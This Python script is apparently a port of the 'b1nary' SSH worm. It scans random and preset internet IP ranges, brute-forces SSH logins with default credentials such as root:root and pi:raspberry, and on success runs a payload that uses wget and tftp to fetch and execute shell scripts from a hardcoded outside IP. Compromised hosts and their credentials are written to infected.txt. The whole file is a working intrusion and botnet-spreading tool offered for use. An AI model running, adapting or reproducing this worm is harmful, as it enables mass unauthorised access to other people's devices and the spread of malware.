#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python 3 port of classic b1nary SSH worm / brute-forcer
SleepTheGod @portknock Alpharetta edition – 2026 POC
"""

import threading
import paramiko
import random
import socket
import time
import sys
import os

# ────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────
PAYLOAD = "cd /tmp || cd /var/run;wget http://148.163.83.79/bin.sh;sh bin.sh;rm -rf bin.sh;tftp -r bint1.sh -g 148.163.83.79;sh bint1.sh;tftp 148.163.83.79 -c get bint2.sh;sh bint2.sh;rm -rf bint1.sh bint2.sh bin.sh\n"

BLACKLIST = ['127']

# Common passwords (you can expand)
passwords = [
    "root:root", "root:admin", "root:1234", "root:toor", "root:maxided",
    "root:pi", "root:alpine", "root:r00tnull3d", "admin:admin", "admin:1234",
    "ubnt:ubnt", "guest:guest", "user:user", "test:test", "pi:raspberry",
    "vagrant:vagrant", "localhost:root", "B1NARY:B1NARY", "tim:tim",
    "CISCO:CISCO", "netgear:netgear", "support:support", "oracle:oracle",
    "cusadmin:password",
]

# IP range presets
br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
lucky = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52","180.180"]
lucky2 = ["119.91","119.92","119.93","113.53"]
load = ["125.25","125.26","125.27","119.92","119.93","180.180","113.53","185.52","122.52","122.53"]
god = ["122.52","122.53","119.92","119.93"]

# ────────────────────────────────────────────────
# ARGUMENT HANDLING
# ────────────────────────────────────────────────
if len(sys.argv) < 5:
    print("Usage: python3 b1naryv3.py [threads] [A|B|C|BRAZIL|SUPER|LUCKY|LUCKY2|RAND|INTERNET] [IPRANGE] [1|2|routers|perl|ubuntu|root|vps1|vps2|vps3|r00ted]")
    sys.exit(1)

THREADS = int(sys.argv[1])
MODE = sys.argv[2].upper()
IPRANGE = sys.argv[3]
PASS_SET = sys.argv[4]

# Password set override
if PASS_SET == '1':
    passwords = ["root:root", "root:admin", "admin:1234"]
elif PASS_SET == '2':
    passwords = ["root:root", "root:toor", "root:admin", "admin:1234", "oracle:oracle", "root:alpine"]
elif PASS_SET == 'routers':
    passwords = ["root:admin", "root:root", "admin:1234", "admin:password", "cisco:cisco", "netgear:netgear", "cusadmin:password"]
elif PASS_SET == 'perl':
    passwords = ["pi:raspberry", "vagrant:vagrant", "ubnt:ubnt"]
elif PASS_SET == 'ubuntu':
    passwords = ["ubnt:ubnt", "ubnt:1234", "ubnt:password"]
elif PASS_SET == 'root':
    passwords = ["root:root", "root:test"]
elif PASS_SET == 'vps1':
    passwords = ["root:maxided", "root:centos6svm", "root:123456", "root:Love2020", "root:Zero", "root:Password", "root:password"]
# ... (other sets omitted for brevity – add them back as needed)

print(f"[SleepTheGod] Starting {THREADS} threads | Mode: {MODE} | Range: {IPRANGE} | Pass set: {PASS_SET}")

# ────────────────────────────────────────────────
# WORKER THREAD
# ────────────────────────────────────────────────
class SSHBrute(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True

    def run(self):
        while True:
            try:
                # Generate random IP based on mode
                if MODE == "A":
                    host = f"{IPRANGE}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                elif MODE == "B":
                    a, b = IPRANGE.split(".")
                    host = f"{a}.{b}.{random.randint(0,255)}.{random.randint(0,255)}"
                elif MODE == "C":
                    a, b, c = IPRANGE.split(".")
                    host = f"{a}.{b}.{c}.{random.randint(0,255)}"
                elif MODE == "BRAZIL":
                    host = f"{random.choice(br)}.{random.randint(0,255)}.{random.randint(0,255)}"
                elif MODE == "SUPER":
                    host = f"{random.choice(yeet)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                elif MODE == "LUCKY":
                    host = f"{random.choice(lucky)}.{random.randint(0,255)}.{random.randint(0,255)}"
                elif MODE == "LUCKY2":
                    host = f"{random.choice(lucky2)}.{random.randint(0,255)}.{random.randint(0,255)}"
                elif MODE == "RAND":
                    host = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                elif MODE == "INTERNET":
                    host = f"{random.choice(['1','2','5','119','180','113','125','122','46','101'])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                else:
                    host = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

                # Skip blacklisted
                if any(bad in host for bad in BLACKLIST):
                    continue

                # Test port 22 open
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                if s.connect_ex((host, 22)) != 0:
                    s.close()
                    continue
                s.close()

                # Try passwords
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                for pwd_entry in passwords:
                    try:
                        user, pw = pwd_entry.split(":")
                    except:
                        continue

                    try:
                        ssh.connect(host, port=22, username=user, password=pw, timeout=5, allow_agent=False, look_for_keys=False)
                        print(f"\033[92m[INFECTED] {host} | {user}:{pw}")
                        ssh.exec_command(PAYLOAD)
                        open("infected.txt", "a").write(f"{user}:{pw}:{host}\n")
                        ssh.close()
                        break
                    except:
                        pass

            except Exception as e:
                pass

# ────────────────────────────────────────────────
# MAIN
# ────────────────────────────────────────────────
if __name__ == "__main__":
    os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999 2>/dev/null")
    os.system("sysctl -w fs.file-max=999999 >/dev/null 2>&1")

    threads = int(sys.argv[1])
    print(f"[SleepTheGod] Launching {threads} brute threads...")

    for _ in range(threads):
        t = SSHBrute()
        t.start()

    # Keep main thread alive
    while True:
        time.sleep(60)
